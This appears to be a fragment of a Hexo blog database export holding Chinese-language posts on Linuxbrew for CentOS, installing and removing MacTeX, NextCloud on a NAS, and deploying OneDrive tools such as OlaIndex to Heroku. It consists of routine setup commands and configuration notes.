href=\"https://github.com/Linuxbrew/brew/wiki/CentOS6\">https://github.com/Linuxbrew/brew/wiki/CentOS6</a>) ，通过<code>HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_BUILD_FROM_SOURCE=1 brew install gcc --without-glibc</code> 进行安装编译，但是其他的依赖安装仍然需要同样的方法进行设置。</p>\n<h3 id=\"不在支持CentOS5旧版本\"><a href=\"#不在支持CentOS5旧版本\" class=\"headerlink\" title=\"不在支持CentOS5旧版本\"></a>不在支持CentOS5旧版本</h3><p>最新的glibc-2.23要求linux内核至少为2.6.16，因此最新的Linuxbrew已经无法安装再CentOS5的旧版本。如果硬要安装，个人感觉可以搜索homebrew-core的glibc为2.19历史版本覆盖最新的homebrew-core来进行安装，但是我因为gmp编译问题，并未安装成功。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>为了能够在自由安装软件也是醉了，折腾了好久，不过安装完毕后，也是非常舒服的。</p>\n"},{"title":"在Mac上配置Mactex","date":"2018-02-25T22:14:39.000Z","_content":"\n# Mactex\n\nMac下使用Latex推荐使用的是Mactex\n\n安装命令\n\n```\nbrew cask install mactex\n```\n\n其中mactex软件包大小达到了\n\n```\nbrew cask install basictex\n```\n\n当然，即使安装了mactex，有时候仍然存在部分依赖的包会不存在，此时需要使用tlgmgr来进行下载软件包\n\n首先更新tlgmgr\n\n```\nsudo tlmgr update --self\n```\n\n然后更新软件包\n\n```\nsudo tlmgr update --all\n```\n\n为了加快下载速度，可以配置国内的镜像，例如[清华的镜像](https://mirrors.tuna.tsinghua.edu.cn/help/CTAN/)，但是主要需要将里面的https地址更改为http。\n\n如果出现错误\n\n> ! LaTeX Error: File `nth.sty' not found.\n> \n> Type X to quit or <RETURN> to proceed,\n> or enter new name. (Default extension: sty)\n\n则可以针对文件名安装对应的包\n\n```\nsudo tlmgr install nth\n```\n\n# 遇到的问题\n\ntlgmgr 如果使用https的镜像时，会发生错误，错误信息如下，但是\n\n>  tlmgr update --self --repository https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/\n>  /Library/TeX/texbin/tlmgr: open tlpdb(https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb) failed: Inappropriate ioctl for device at /usr/local/texlive/2017basic/tlpkg/TeXLive/TLPDB.pm line 362.\n\n暂时可以通过将https修改为http的方法绕过\n\n有些软件包名字并不一致，例如nth.sty，通过[搜索](https://tex.stackexchange.com/questions/135402/package-nth-is-in-ctan-but-tlmgr-doesnt-find-it)可以得知包含该文件的包名为gen­misc，可以首先在ctan上搜索，然后找到对应的包名\n\n# 卸载Mactex\n\nMactex不同版本会安装到不同的目录下，不会覆盖，会占用比较多的空间，有时候需要删除旧版本。可以受限参考[官网的卸载教程](https://www.tug.org/mactex/uninstalling.html)，但是个人删除经验如下\n\n```\nsudo rm -rf /Library/TeX/Distributions/TeXLive-2017-Basic.texdist\nsudo rm -rf /Library/TeX/Distributions/.FactoryDefaults/TeXLive-2017-Basic\nsudo rm -rf /usr/local/texlive/2017basic\n```","source":"_posts/Install-Mactex.md","raw":"title: 在Mac上配置Mactex\ndate: 2018-02-25 22:14:39\ntags:\n---\n\n# Mactex\n\nMac下使用Latex推荐使用的是Mactex\n\n安装命令\n\n```\nbrew cask install mactex\n```\n\n其中mactex软件包大小达到了\n\n```\nbrew cask install basictex\n```\n\n当然，即使安装了mactex，有时候仍然存在部分依赖的包会不存在，此时需要使用tlgmgr来进行下载软件包\n\n首先更新tlgmgr\n\n```\nsudo tlmgr update --self\n```\n\n然后更新软件包\n\n```\nsudo tlmgr update --all\n```\n\n为了加快下载速度，可以配置国内的镜像，例如[清华的镜像](https://mirrors.tuna.tsinghua.edu.cn/help/CTAN/)，但是主要需要将里面的https地址更改为http。\n\n如果出现错误\n\n> ! LaTeX Error: File `nth.sty' not found.\n> \n> Type X to quit or <RETURN> to proceed,\n> or enter new name. (Default extension: sty)\n\n则可以针对文件名安装对应的包\n\n```\nsudo tlmgr install nth\n```\n\n# 遇到的问题\n\ntlgmgr 如果使用https的镜像时，会发生错误，错误信息如下，但是\n\n>  tlmgr update --self --repository https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/\n>  /Library/TeX/texbin/tlmgr: open tlpdb(https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb) failed: Inappropriate ioctl for device at /usr/local/texlive/2017basic/tlpkg/TeXLive/TLPDB.pm line 362.\n\n暂时可以通过将https修改为http的方法绕过\n\n有些软件包名字并不一致，例如nth.sty，通过[搜索](https://tex.stackexchange.com/questions/135402/package-nth-is-in-ctan-but-tlmgr-doesnt-find-it)可以得知包含该文件的包名为gen­misc，可以首先在ctan上搜索，然后找到对应的包名\n\n# 卸载Mactex\n\nMactex不同版本会安装到不同的目录下，不会覆盖，会占用比较多的空间，有时候需要删除旧版本。可以受限参考[官网的卸载教程](https://www.tug.org/mactex/uninstalling.html)，但是个人删除经验如下\n\n```\nsudo rm -rf /Library/TeX/Distributions/TeXLive-2017-Basic.texdist\nsudo rm -rf /Library/TeX/Distributions/.FactoryDefaults/TeXLive-2017-Basic\nsudo rm -rf /usr/local/texlive/2017basic\n```","slug":"Install-Mactex","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmr000lxrn5bgkaa9c3","content":"<h1 id=\"Mactex\"><a href=\"#Mactex\" class=\"headerlink\" title=\"Mactex\"></a>Mactex</h1><p>Mac下使用Latex推荐使用的是Mactex</p>\n<p>安装命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install mactex</span><br></pre></td></tr></table></figure>\n\n<p>其中mactex软件包大小达到了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install basictex</span><br></pre></td></tr></table></figure>\n\n<p>当然，即使安装了mactex，有时候仍然存在部分依赖的包会不存在，此时需要使用tlgmgr来进行下载软件包</p>\n<p>首先更新tlgmgr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr update --self</span><br></pre></td></tr></table></figure>\n\n<p>然后更新软件包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr update --all</span><br></pre></td></tr></table></figure>\n\n<p>为了加快下载速度，可以配置国内的镜像，例如<a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/CTAN/\">清华的镜像</a>，但是主要需要将里面的https地址更改为http。</p>\n<p>如果出现错误</p>\n<blockquote>\n<p>! LaTeX Error: File &#96;nth.sty’ not found.</p>\n<p>Type X to quit or <RETURN> to proceed,<br>or enter new name. (Default extension: sty)</p>\n</blockquote>\n<p>则可以针对文件名安装对应的包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr install nth</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h1><p>tlgmgr 如果使用https的镜像时，会发生错误，错误信息如下，但是</p>\n<blockquote>\n<p> tlmgr update –self –repository <a href=\"https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/\">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/</a><br> &#x2F;Library&#x2F;TeX&#x2F;texbin&#x2F;tlmgr: open tlpdb(<a href=\"https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb\">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb</a>) failed: Inappropriate ioctl for device at &#x2F;usr&#x2F;local&#x2F;texlive&#x2F;2017basic&#x2F;tlpkg&#x2F;TeXLive&#x2F;TLPDB.pm line 362.</p>\n</blockquote>\n<p>暂时可以通过将https修改为http的方法绕过</p>\n<p>有些软件包名字并不一致，例如nth.sty，通过<a href=\"https://tex.stackexchange.com/questions/135402/package-nth-is-in-ctan-but-tlmgr-doesnt-find-it\">搜索</a>可以得知包含该文件的包名为gen­misc，可以首先在ctan上搜索，然后找到对应的包名</p>\n<h1 id=\"卸载Mactex\"><a href=\"#卸载Mactex\" class=\"headerlink\" title=\"卸载Mactex\"></a>卸载Mactex</h1><p>Mactex不同版本会安装到不同的目录下，不会覆盖，会占用比较多的空间，有时候需要删除旧版本。可以受限参考<a href=\"https://www.tug.org/mactex/uninstalling.html\">官网的卸载教程</a>，但是个人删除经验如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm -rf /Library/TeX/Distributions/TeXLive-2017-Basic.texdist</span><br><span class=\"line\">sudo rm -rf /Library/TeX/Distributions/.FactoryDefaults/TeXLive-2017-Basic</span><br><span class=\"line\">sudo rm -rf /usr/local/texlive/2017basic</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"Mactex\"><a href=\"#Mactex\" class=\"headerlink\" title=\"Mactex\"></a>Mactex</h1><p>Mac下使用Latex推荐使用的是Mactex</p>\n<p>安装命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install mactex</span><br></pre></td></tr></table></figure>\n\n<p>其中mactex软件包大小达到了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install basictex</span><br></pre></td></tr></table></figure>\n\n<p>当然，即使安装了mactex，有时候仍然存在部分依赖的包会不存在，此时需要使用tlgmgr来进行下载软件包</p>\n<p>首先更新tlgmgr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr update --self</span><br></pre></td></tr></table></figure>\n\n<p>然后更新软件包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr update --all</span><br></pre></td></tr></table></figure>\n\n<p>为了加快下载速度，可以配置国内的镜像，例如<a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/CTAN/\">清华的镜像</a>，但是主要需要将里面的https地址更改为http。</p>\n<p>如果出现错误</p>\n<blockquote>\n<p>! LaTeX Error: File &#96;nth.sty’ not found.</p>\n<p>Type X to quit or <RETURN> to proceed,<br>or enter new name. (Default extension: sty)</p>\n</blockquote>\n<p>则可以针对文件名安装对应的包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tlmgr install nth</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h1><p>tlgmgr 如果使用https的镜像时，会发生错误，错误信息如下，但是</p>\n<blockquote>\n<p> tlmgr update –self –repository <a href=\"https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/\">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet/</a><br> &#x2F;Library&#x2F;TeX&#x2F;texbin&#x2F;tlmgr: open tlpdb(<a href=\"https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb\">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnet//tlpkg/texlive.tlpdb</a>) failed: Inappropriate ioctl for device at &#x2F;usr&#x2F;local&#x2F;texlive&#x2F;2017basic&#x2F;tlpkg&#x2F;TeXLive&#x2F;TLPDB.pm line 362.</p>\n</blockquote>\n<p>暂时可以通过将https修改为http的方法绕过</p>\n<p>有些软件包名字并不一致，例如nth.sty，通过<a href=\"https://tex.stackexchange.com/questions/135402/package-nth-is-in-ctan-but-tlmgr-doesnt-find-it\">搜索</a>可以得知包含该文件的包名为gen­misc，可以首先在ctan上搜索，然后找到对应的包名</p>\n<h1 id=\"卸载Mactex\"><a href=\"#卸载Mactex\" class=\"headerlink\" title=\"卸载Mactex\"></a>卸载Mactex</h1><p>Mactex不同版本会安装到不同的目录下，不会覆盖，会占用比较多的空间，有时候需要删除旧版本。可以受限参考<a href=\"https://www.tug.org/mactex/uninstalling.html\">官网的卸载教程</a>，但是个人删除经验如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm -rf /Library/TeX/Distributions/TeXLive-2017-Basic.texdist</span><br><span class=\"line\">sudo rm -rf /Library/TeX/Distributions/.FactoryDefaults/TeXLive-2017-Basic</span><br><span class=\"line\">sudo rm -rf /usr/local/texlive/2017basic</span><br></pre></td></tr></table></figure>"},{"title":"Openmediavalut 配置","date":"2019-11-12T18:10:48.000Z","_content":"\n# NextCloud 配置\n\n遇到问题\n\n通过对 php-fpm 实例设置代理实例，可以实现\n\n\n[Passing system environment variables to PHP-FPM when using NGINX](https://medium.com/@tomahock/passing-system-environment-variables-to-php-fpm-when-using-nginx-a70045370fad)","source":"_posts/Install-Nas.md","raw":"title: Openmediavalut 配置\ndate: 2019-11-12 18:10:48\ntags:\n---\n\n# NextCloud 配置\n\n遇到问题\n\n通过对 php-fpm 实例设置代理实例，可以实现\n\n\n[Passing system environment variables to PHP-FPM when using NGINX](https://medium.com/@tomahock/passing-system-environment-variables-to-php-fpm-when-using-nginx-a70045370fad)","slug":"Install-Nas","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmms000nxrn5480ydax3","content":"<h1 id=\"NextCloud-配置\"><a href=\"#NextCloud-配置\" class=\"headerlink\" title=\"NextCloud 配置\"></a>NextCloud 配置</h1><p>遇到问题</p>\n<p>通过对 php-fpm 实例设置代理实例，可以实现</p>\n<p><a href=\"https://medium.com/@tomahock/passing-system-environment-variables-to-php-fpm-when-using-nginx-a70045370fad\">Passing system environment variables to PHP-FPM when using NGINX</a></p>\n","excerpt":"","more":"<h1 id=\"NextCloud-配置\"><a href=\"#NextCloud-配置\" class=\"headerlink\" title=\"NextCloud 配置\"></a>NextCloud 配置</h1><p>遇到问题</p>\n<p>通过对 php-fpm 实例设置代理实例，可以实现</p>\n<p><a href=\"https://medium.com/@tomahock/passing-system-environment-variables-to-php-fpm-when-using-nginx-a70045370fad\">Passing system environment variables to PHP-FPM when using NGINX</a></p>\n"},{"title":"配置安装 Onedrive 相关工具","date":"2019-09-18T11:57:09.000Z","_content":"\n# 简介\n\nOnedrive 是微软提供的一个共享网盘服务。随着 360 云盘的下线和百度云盘的下载限速，国内好用的网盘越来越少。之前也找过不少的软件实现百度云盘的高速下载，但是最近已经被屏蔽的差不多了，唯一的方法是购买 SVIP 帐号了，评估之下觉得还是需要将自己搜集的大部分公用数据分散转移，因此选择了 Onedrive 进行存储。\n\n最初的 Onedrive 国内下载速度较慢，但是目前经过网络优化，下载速度提高了很多，大文件的下载速度能够接受，甚至看到有些人直接利用 Onedrive 做视频点播。最主要的一点是很多人基于 Office 的开放 API 实现了很多基于 Onedrive 的程序，大大提高了可用性，使得我这样不经常使用 Windows 的人也能够受益其中。\n\n# 申请帐号相关\n\n注册 Onedrive 的，按照安全与可持久性的原则列出如下：\n\n### 1. 个人/家庭订阅 Office 365\n\n最可靠的渠道，个人版 398元/年一个用户，家庭版 498元/年六个用户，有一定的经济成本。\n\n### 2. Office 365 教育版\n\n使用与微软合作的大学的edu邮箱可以注册。这个限制在于并不是所有的学校都在范围内，因此需要你查看学校的具体情况。此外根据微软的条款，虽然毕业后可以继续使用，但是微软官方的说明是*我们可能会随时验证您是否符合条件*。注意可以选择注册为教职员工来规避这一点，此外学校管理员可以看到个人存储的数据。\n\n### 3. Office 365 E5 开发人员订阅\n\n针对开发人员的优惠订阅，缺点是*你的订阅可使用 90 天，并且基于有效开发人员活动续订。 如果正在将订阅用于开发，订阅将每 3 个月续订一次，可以无限期延期*。而且网上目前也没有*有效开发人员活动*的具体定义，因此存在被突然停用的风险。\n\n### 4. 第三方买家购买\n\n价格不会很高，但是这种帐号的来源乱七八糟，需要自己辨别。最重要的这种帐号的管理员肯定能够浏览你个人存储的数据，有一定的数据泄露风险。\n\n# OnedriveCMD\n\nOneDriveCMD 是一个 Onedrive 的命令行版本，可以通过命令行进行文件的上传和下载。\n\n推荐安装 Python 3.x 版本的 OnedriveCMD，能够有效的处理中文字符串，避免一些问题。\n\n如果存在多个账户，可以利用 `onedrive -conf config.json` 来指定所使用的配置文件，实现多个账户。\n\n如果觉得命令行使用局限性太多，可以使用 rclone 将 Onedrive 挂载到本地目录上，深度整合如操作系统。\n\n# OlaIndex\n\nOlaIndex 是一个提供 Onedrive 在线文件目录访问的服务，能够直接下载上传文件，并在线观看视频。\n\n之前网络上最常用教程的是使用 Now.sh 在线搭建 OneIndex，但是随着 Now.sh 逐渐下线对 Docker 容器的支持，架构切换到 Serverless，并且免费用户只能部署不超过32个文件，因此基于 OneIndex 的部署方式不再可行。另外一种方法是在 Heroku 上搭建，当然也可以使用 OneIndex，但是这时发现更好的程序是 OlaIndex，加密等功能更加强大，因此切换到了这个界面是。\n\n## 版本选择\n\n在写本文的时候，发现直接 OlaIndex 上的 master 分支代码存在一些问题，直接安装后遇到了 [issue-171](https://github.com/WangNingkai/OLAINDEX/issues/171) 的问题，而 release 页面下的 [3.2.1](https://github.com/WangNingkai/OLAINDEX/releases/tag/v3.2.1) 版本却缺乏密码设置，并不是 3.x 的最新版，最后发现 [release 分支](https://github.com/WangNingkai/OLAINDEX/tree/release) 才是 3.x 版本的可用分支，这里不得不吐槽下作者的混乱管理。\n\n4.x 版本有较大更改，因此下文一些信息可能就不适用。\n\n## 部署过程\n\n网上也有一些相关的部署文档，但是试用下来却发现仍然有一定的错误，所以再详细记录下安装过程:\n\n1. 构建本地环境\n\n```\ngit clone --depth=1 -b release https://github.com/WangNingkai/OLAINDEX.git\ncd OLAINDEX\nrm -rf .git\ncomposer install -vvv\n```\n\n2. 配置 heroku 环境\n\n```\ngit init\necho web: vendor/bin/heroku-php-apache2 public/ > Procfile\ngit add -f composer.lock\nheroku create\nheroku buildpacks:set heroku/php\ngit push heroku master\nheroku config:set APP_KEY=xxx\nheroku config:set APP_URL=xxx\ncp .env.example .env\n```\n\n修改 `.env` 文件中的环境变量，URL、KEY 信息，注释掉文件中的 redis 配置。\n\n>APP_ENV=production  \n>APP_KEY=XXX  \n>APP_DEBUG=false  \n>APP_URL=https://XXX.herokuapp.com\n\n```\ngit add -f .env\ngit add .\ngit commit -m \"init\"\ngit push heroku master\n```\n\n执行 `heroku create` 后就能够看到自动分配的网址了，如果不满意可以执行 `heroku rename XXX` 来修改这个网址。\n\n## 保存设置\n\nheroku 的应用策略是默认是隔一段时间会自动休眠，这样一段时间没有访问后，应用会重新打开并需要重新初始化，网上有一个方法是运行命令：\n\n`heroku run bash`\n\n然后进入运行环境后，保存 `storage/app/config.json` 文件。但是我实际进入后，没有发现有什么保存的文件，因此失败。\n\n因此我选择的方法是先在本地跑了一个 Docker 服务（避免搭建环境），然后初始化网站，注意因为是本地 Docker，所以没有 HTTPS 域名，需要利用中转 HTTPS 域名进行中转才行，这也是这种方法的一个小隐患。初始化完成后进入 Docker 后保存 `storage/app/config.json` 到项目目录中，再次提交。这样就算每次重置了应用，也可以利用保存的会话信息跳过初始化过程。\n\n## 其他配置\n\n部署完成后，发现虽然首页是 HTTPS 的，但是里面的链接都是 HTTP 链接，只不过打开后会自动跳转到对应的 HTTPS 链接而已，在密码框输入时 Firefox 也会提醒流量未加密。这是因为在使用负载均衡器的情况下，Laravel 接收到的来源是非加密流量，所以需要修改文件 `app\\Http\\Middleware\\TrustProxies.php`：\n\n```\n<?php\nnamespace App\\Http\\Middleware;\nuse Illuminate\\Http\\Request;\nuse Fideloper\\Proxy\\TrustProxies as Middleware;\nclass TrustProxies extends Middleware\n{\n    protected $proxies = '*';\n    protected $headers = Request:: HEADER_X_FORWARDED_AWS_ELB;\n}\n```\n\n# 参考文档\n\n* [Office 365 教育版](https://www.microsoft.com/zh-cn/education/products/office)\n\n* [Office 365 开发人员计划订阅到期和续订](https://docs.microsoft.com/zh-cn/office/developer-program/subscription-expiration-and-renewal)\n\n* [now.sh 免费部署 oneindex](https://www.ouyangsong.com/posts/43735/)\n\n* [关于在 Heroku 部署时 HTTPS 的跳转](https://github.com/WangNingkai/OLAINDEX/issues/63)\n\n* [getting-started-with-laravel#trusting-the-load-balancer](https://devcenter.heroku.com/articles/getting-started-with-laravel#trusting-the-load-balancer)\n\n* [【sharepoint】解读onedrive每天流量限制](https://www.abbeyok.com/archives/266)","source":"_posts/Install-Onedrive-Tools.md","raw":"title: 配置安装 Onedrive 相关工具\ndate: 2019-09-18 11:57:09\ntags:\n---\n\n# 简介\n\nOnedrive 是微软提供的一个共享网盘服务。随着 360 云盘的下线和百度云盘的下载限速，国内好用的网盘越来越少。之前也找过不少的软件实现百度云盘的高速下载，但是最近已经被屏蔽的差不多了，唯一的方法是购买 SVIP 帐号了，评估之下觉得还是需要将自己搜集的大部分公用数据分散转移，因此选择了 Onedrive 进行存储。\n\n最初的 Onedrive 国内下载速度较慢，但是目前经过网络优化，下载速度提高了很多，大文件的下载速度能够接受，甚至看到有些人直接利用 Onedrive 做视频点播。最主要的一点是很多人基于 Office 的开放 API 实现了很多基于 Onedrive 的程序，大大提高了可用性，使得我这样不经常使用 Windows 的人也能够受益其中。\n\n# 申请帐号相关\n\n注册 Onedrive 的，按照安全与可持久性的原则列出如下：\n\n### 1. 个人/家庭订阅 Office 365\n\n最可靠的渠道，个人版 398元/年一个用户，家庭版 498元/年六个用户，有一定的经济成本。\n\n### 2. Office 365 教育版\n\n使用与微软合作的大学的edu邮箱可以注册。这个限制在于并不是所有的学校都在范围内，因此需要你查看学校的具体情况。此外根据微软的条款，虽然毕业后可以继续使用，但是微软官方的说明是*我们可能会随时验证您是否符合条件*。注意可以选择注册为教职员工来规避这一点，此外学校管理员可以看到个人存储的数据。\n\n### 3. Office 365 E5 开发人员订阅\n\n针对开发人员的优惠订阅，缺点是*你的订阅可使用 90 天，并且基于有效开发人员活动续订。 如果正在将订阅用于开发，订阅将每 3 个月续订一次，可以无限期延期*。而且网上目前也没有*有效开发人员活动*的具体定义，因此存在被突然停用的风险。\n\n### 4. 第三方买家购买\n\n价格不会很高，但是这种帐号的来源乱七八糟，需要自己辨别。最重要的这种帐号的管理员肯定能够浏览你个人存储的数据，有一定的数据泄露风险。\n\n# OnedriveCMD\n\nOneDriveCMD 是一个 Onedrive 的命令行版本，可以通过命令行进行文件的上传和下载。\n\n推荐安装 Python 3.x 版本的 OnedriveCMD，能够有效的处理中文字符串，避免一些问题。\n\n如果存在多个账户，可以利用 `onedrive -conf config.json` 来指定所使用的配置文件，实现多个账户。\n\n如果觉得命令行使用局限性太多，可以使用 rclone 将 Onedrive 挂载到本地目录上，深度整合如操作系统。\n\n# OlaIndex\n\nOlaIndex 是一个提供 Onedrive 在线文件目录访问的服务，能够直接下载上传文件，并在线观看视频。\n\n之前网络上最常用教程的是使用 Now.sh 在线搭建 OneIndex，但是随着 Now.sh 逐渐下线对 Docker 容器的支持，架构切换到 Serverless，并且免费用户只能部署不超过32个文件，因此基于 OneIndex 的部署方式不再可行。另外一种方法是在 Heroku 上搭建，当然也可以使用 OneIndex，但是这时发现更好的程序是 OlaIndex，加密等功能更加强大，因此切换到了这个界面是。\n\n## 版本选择\n\n在写本文的时候，发现直接 OlaIndex 上的 master 分支代码存在一些问题，直接安装后遇到了 [issue-171](https://github.com/WangNingkai/OLAINDEX/issues/171) 的问题，而 release 页面下的 [3.2.1](https://github.com/WangNingkai/OLAINDEX/releases/tag/v3.2.1) 版本却缺乏密码设置，并不是 3.x 的最新版，最后发现 [release 分支](https://github.com/WangNingkai/OLAINDEX/tree/release) 才是 3.x 版本的可用分支，这里不得不吐槽下作者的混乱管理。\n\n4.x 版本有较大更改，因此下文一些信息可能就不适用。\n\n## 部署过程\n\n网上也有一些相关的部署文档，但是试用下来却发现仍然有一定的错误，所以再详细记录下安装过程:\n\n1. 构建本地环境\n\n```\ngit clone --depth=1 -b release https://github.com/WangNingkai/OLAINDEX.git\ncd OLAINDEX\nrm -rf .git\ncomposer install -vvv\n```\n\n2. 配置 heroku 环境\n\n```\ngit init\necho web: vendor/bin/heroku-php-apache2 public/ > Procfile\ngit add -f composer.lock\nheroku create\nheroku buildpacks:set heroku/php\ngit push heroku master\nheroku config:set APP_KEY=xxx\nheroku config:set APP_URL=xxx\ncp .env.example .env\n```\n\n修改 `.env` 文件中的环境变量，URL、KEY 信息，注释掉文件中的 redis 配置。\n\n>APP_ENV=production  \n>APP_KEY=XXX  \n>APP_DEBUG=false  \n>APP_URL=https://XXX.herokuapp.com\n\n```\ngit add -f .env\ngit add .\ngit commit -m \"init\"\ngit push heroku master\n```\n\n执行 `heroku create` 后就能够看到自动分配的网址了，如果不满意可以执行 `heroku rename XXX` 来修改这个网址。\n\n## 保存设置\n\nheroku 的应用策略是默认是隔一段时间会自动休眠，这样一段时间没有访问后，应用会重新打开并需要重新初始化，网上有一个方法是运行命令：\n\n`heroku run bash`\n\n然后进入运行环境后，保存 `storage/app/config.json` 文件。但是我实际进入后，没有发现有什么保存的文件，因此失败。\n\n因此我选择的方法是先在本地跑了一个 Docker 服务（避免搭建环境），然后初始化网站，注意因为是本地 Docker，所以没有 HTTPS 域名，需要利用中转 HTTPS 域名进行中转才行，这也是这种方法的一个小隐患。初始化完成后进入 Docker 后保存 `storage/app/config.json` 到项目目录中，再次提交。这样就算每次重置了应用，也可以利用保存的会话信息跳过初始化过程。\n\n## 其他配置\n\n部署完成后，发现虽然首页是 HTTPS 的，但是里面的链接都是 HTTP 链接，只不过打开后会自动跳转到对应的 HTTPS 链接而已，在密码框输入时 Firefox 也会提醒流量未加密。这是因为在使用负载均衡器的情况下，Laravel 接收到的来源是非加密流量，所以需要修改文件 `app\\Http\\Middleware\\TrustProxies.php`：\n\n```\n<?php\nnamespace App\\Http\\Middleware;\nuse Illuminate\\Http\\Request;\nuse Fideloper\\Proxy\\TrustProxies as Middleware;\nclass TrustProxies extends Middleware\n{\n    protected $proxies = '*';\n    protected $headers = Request:: HEADER_X_FORWARDED_AWS_ELB;\n}\n```\n\n# 参考文档\n\n* [Office 365 教育版](https://www.microsoft.com/zh-cn/education/products/office)\n\n* [Office 365 开发人员计划订阅到期和续订](https://docs.microsoft.com/zh-cn/office/developer-program/subscription-expiration-and-renewal)\n\n* [now.sh 免费部署 oneindex](https://www.ouyangsong.com/posts/43735/)\n\n* [关于在 Heroku 部署时 HTTPS 的跳转](https://github.com/WangNingkai/OLAINDEX/issues/63)\n\n* [getting-started-with-laravel#trusting-the-load-balancer](https://devcenter.heroku.com/articles/getting-started-with-laravel#trusting-the-load-balancer)\n\n* [【sharepoint】解读onedrive每天流量限制](https://www.abbeyok.com/archives/266)","slug":"Install-Onedrive-Tools","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmms000pxrn5730jdh1y","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>Onedrive 是微软提供的一个共享网盘服务。随着 360 云盘的下线和百度云盘的下载限速，国内好用的网盘越来越少。之前也找过不少的软件实现百度云盘的高速下载，但是最近已经被屏蔽的差不多了，唯一的方法是购买 SVIP 帐号了，评估之下觉得还是需要将自己搜集的大部分公用数据分散转移，因此选择了 Onedrive 进行存储。</p>\n<p>最初的 Onedrive 国内下载速度较慢，但是目前经过网络优化，下载速度提高了很多，大文件的下载速度能够接受，甚至看到有些人直接利用 Onedrive 做视频点播。最主要的一点是很多人基于 Office 的开放 API 实现了很多基于 Onedrive 的程序，大大提高了可用性，使得我这样不经常使用 Windows 的人也能够受益其中。</p>\n<h1 id=\"申请帐号相关\"><a href=\"#申请帐号相关\" class=\"headerlink\" title=\"申请帐号相关\"></a>申请帐号相关</h1><p>注册 Onedrive 的，按照安全与可持久性的原则列出如下：</p>\n<h3 id=\"1-个人-家庭订阅-Office-365\"><a href=\"#1-个人-家庭订阅-Office-365\" class=\"headerlink\" title=\"1. 个人&#x2F;家庭订阅 Office 365\"></a>1. 个人&#x2F;家庭订阅 Office 365</h3><p>最可靠的渠道，个人版 398元&#x2F;年一个用户，家庭版 498元&#x2F;年六个用户，有一定的经济成本。</p>\n<h3 id=\"2-Office-365-教育版\"><a href=\"#2-Office-365-教育版\" class=\"headerlink\" title=\"2. Office 365 教育版\"></a>2. Office 365 教育版</h3><p>使用与微软合作的大学的edu邮箱可以注册。这个限制在于并不是所有的学校都在范围内，因此需要你查看学校的具体情况。此外根据微软的条款，虽然毕业后可以继续使用，但是微软官方的说明是<em>我们可能会随时验证您是否符合条件</em>。注意可以选择注册为教职员工来规避这一点，此外学校管理员可以看到个人存储的数据。</p>\n<h3 